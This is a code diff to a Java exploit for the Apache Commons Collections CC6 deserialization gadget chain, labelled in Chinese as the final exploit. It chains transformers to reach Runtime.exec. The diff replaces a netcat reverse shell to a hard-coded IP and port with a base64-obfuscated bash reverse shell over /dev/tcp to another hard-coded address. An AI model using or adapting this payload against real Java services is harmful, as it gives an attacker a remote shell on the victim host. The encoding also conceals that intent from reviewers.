@@ -1,3 +1,5 @@
+package CC6ysoEXP;
+
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -13,7 +15,7 @@ import java.util.Map;
 // CC6 链最终 EXP
 public class FinalCC6EXP {
     public static void main(String[] args) throws Exception{
-        String[] cmd = {"nc 81.68.120.14 9990 -e /bin/bash"};
+        String[] cmd = {"\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjIxLjEzOC8yMzM0IDA+JjE=}|{base64,-d}|{bash,-i}\"}"};
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
